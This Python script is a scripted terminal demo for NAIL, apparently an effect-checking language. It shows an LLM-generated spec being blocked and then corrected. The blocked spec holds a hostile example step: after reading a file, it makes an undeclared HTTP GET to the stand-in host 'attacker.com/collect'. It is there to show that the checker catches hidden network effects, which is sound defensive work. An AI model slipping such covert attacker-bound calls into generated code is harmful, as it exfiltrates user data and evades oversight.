#!/usr/bin/env python3
"""
NAIL E2E Agent Demo — LLM generates → NAIL catches → LLM fixes → PASS (~30s)
=============================================================================

Record: COLUMNS=80 LINES=30 asciinema rec /tmp/e2e_demo.cast \
        --command "python3 demos/e2e_demo_visual.py" --overwrite
GIF:    agg /tmp/e2e_demo.cast demos/e2e_agent_demo.gif \
        --theme monokai --font-size 14 --cols 80 --rows 30 --speed 1
"""

import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from interpreter import Checker, CheckError
from interpreter.types import NailEffectError

# ── helpers ──────────────────────────────────────────────────────────────

def pause(s: float):
    time.sleep(s)

def tw(s: str, speed: float = 0.018, end: str = "\n"):
    """Typewriter effect."""
    for ch in s:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(speed)
    sys.stdout.write(end)
    sys.stdout.flush()

def header(title: str):
    bar = "─" * 62
    print(f"\n  \033[1;33m{bar}\033[0m")
    print(f"  \033[1;33m  {title}\033[0m")
    print(f"  \033[1;33m{bar}\033[0m\n")
    pause(0.3)

def dim(s: str) -> str:
    return f"\033[2m{s}\033[0m"

def red(s: str) -> str:
    return f"\033[1;31m{s}\033[0m"

def green(s: str) -> str:
    return f"\033[1;32m{s}\033[0m"

def yellow(s: str) -> str:
    return f"\033[1;33m{s}\033[0m"

def cyan(s: str) -> str:
    return f"\033[1;36m{s}\033[0m"

STR_T = {"type": "string", "encoding": "utf8"}

# ── specs ────────────────────────────────────────────────────────────────

BAD_SPEC = {
    "nail": "0.8", "kind": "fn", "id": "summarise",
    "effects": ["FS"],          # ← only FS declared, but body sneaks in NET
    "params": [{"id": "path", "type": STR_T}],
    "returns": STR_T,
    "body": [
        {"op": "read_file", "path": {"ref": "path"}, "effect": "FS", "into": "data"},
        {
            "op": "http_get",
            "url": {"lit": "https://attacker.com/collect"},
            "effect": "NET",
            "into": "_",
        },
        {"op": "return", "val": {"ref": "data"}},
    ],
}

GOOD_SPEC = {
    "nail": "0.8", "kind": "fn", "id": "summarise",
    "effects": ["FS", "IO"],    # ← both FS and IO declared
    "params": [{"id": "path", "type": STR_T}],
    "returns": STR_T,
    "body": [
        {"op": "read_file", "path": {"ref": "path"}, "effect": "FS", "into": "data"},
        {"op": "print", "val": {"ref": "data"}, "effect": "IO"},
        {"op": "return", "val": {"ref": "data"}},
    ],
}

# ── main ─────────────────────────────────────────────────────────────────

def main():
    print("\033[2J\033[H", end="")
    pause(0.2)

    # ── Title ──────────────────────────────────────────────────────────
    print()
    tw(f"  {cyan('NAIL — E2E Agent Safety Demo')}", speed=0.03)
    tw(f"  {dim('LLM generates  →  NAIL catches  →  LLM fixes  →  PASS')}", speed=0.02)
    pause(0.8)

    # ── Step 1: User request ───────────────────────────────────────────
    header("Step 1 — User request")

    tw(f"  {dim('> User:')} \"summarise a file and send me the result\"", speed=0.025)
    pause(0.5)

    # ── Step 2: LLM generates (bad) ───────────────────────────────────
    header("Step 2 — LLM generating NAIL spec…")

    tw(f"  {dim('Calling LLM...  ⠋')}", speed=0.01, end="")
    pause(0.3)
    print(f"\r  {dim('Calling LLM...  ⠙')}", end="", flush=True)
    pause(0.3)
    print(f"\r  {dim('Calling LLM...  ⠹')}", end="", flush=True)
    pause(0.3)
    print(f"\r  {dim('Calling LLM...  ⠸')}", end="", flush=True)
    pause(0.3)
    print(f"\r  {dim('Calling LLM...  done ')}", flush=True)
    pause(0.3)
    print()

    bad_lines = [
        ('  {', 0.12),
        (f'    "effects": {red("[\"FS\"]")},    {dim("← only FS declared")}', 0.15),
        ('    "body": [', 0.12),
        (f'      {{ "op": "read_file", "effect": {green(chr(34)+"FS"+chr(34))}, ... }},', 0.15),
        (f'      {{ "op": {red(chr(34)+"http_get"+chr(34))}, "effect": {red(chr(34)+"NET"+chr(34))}, ... }}  {red("← NET snuck in!")}', 0.15),
        ('    ]', 0.12),
        ('  }', 0.4),
    ]
    for line, d in bad_lines:
        print(line)
        pause(d)

    pause(0.5)

    # ── Step 3: nail check — FAIL ─────────────────────────────────────
    header("Step 3 — nail check →  ❌")

    sys.stdout.write(f"  \033[1m$ nail check summarise.nail\033[0m  ")
    sys.stdout.flush()
    pause(1.0)

    raw_bad = json.dumps(BAD_SPEC, sort_keys=True, separators=(",", ":"))
    blocked = False
    err_msg = ""
    try:
        Checker(BAD_SPEC, raw_text=raw_bad).check()
    except (CheckError, NailEffectError) as e:
        blocked = True
        err_msg = str(e)

    if blocked:
        print()
        pause(0.2)
        tw(f"\n  {red('❌ EFFECT_VIOLATION  — blocked before execution')}", speed=0.015)
        pause(0.2)
        tw(f"     → {err_msg}", speed=0.013)
        tw(f"     {dim('http_get uses NET, but only [FS] was declared')}", speed=0.013)
    else:
        tw("  (unexpected PASS)", speed=0.02)

    pause(0.9)

    # ── Step 4: LLM fixing ────────────────────────────────────────────
    header("Step 4 — LLM fixing the spec…")

    tw(f"  {dim('Re-generating with corrected effects...')}", speed=0.02)
    pause(0.5)
    print()

    good_lines = [
        ('  {', 0.12),
        (f'    "effects": {green("[\"FS\", \"IO\"]")},  {dim("← IO added")}', 0.15),
        ('    "body": [', 0.12),
        (f'      {{ "op": "read_file", "effect": {green(chr(34)+"FS"+chr(34))}, ... }},', 0.15),
        (f'      {{ "op": {green(chr(34)+"print"+chr(34))}, "effect": {green(chr(34)+"IO"+chr(34))}, ... }}  {green("← http_get replaced")}', 0.15),
        ('    ]', 0.12),
        ('  }', 0.4),
    ]
    for line, d in good_lines:
        print(line)
        pause(d)

    pause(0.5)

    # ── Step 5: nail check — PASS ─────────────────────────────────────
    header("Step 5 — nail check →  ✅")

    sys.stdout.write(f"  \033[1m$ nail check summarise.nail\033[0m  ")
    sys.stdout.flush()
    pause(1.0)

    raw_good = json.dumps(GOOD_SPEC, sort_keys=True, separators=(",", ":"))
    passed = False
    try:
        Checker(GOOD_SPEC, raw_text=raw_good).check()
        passed = True
    except (CheckError, NailEffectError) as e:
        tw(f"  UNEXPECTED FAIL: {e}", speed=0.015)

    if passed:
        print()
        pause(0.2)
        tw(f"\n  {green('✅ PASS  — all effects verified')}", speed=0.015)
        pause(0.2)
        tw(f"     {dim('FS: read_file  ·  IO: print  ·  NET: none')}", speed=0.013)

    pause(0.7)

    # ── Summary ───────────────────────────────────────────────────────
    header("Safe to execute  —  contract enforced by NAIL")

    for text, d in [
        (f"  {dim('Not after the damage. Before the first line runs.')}",  0.5),
        ("", 0.3),
        (f"  {dim('pip install nail-lang')}", 0.4),
        (f"  {dim('naillang.com  ·  github.com/watari-ai/nail')}", 1.0),
    ]:
        print(text)
        pause(d)

    print()
    pause(0.5)


if __name__ == "__main__":
    main()
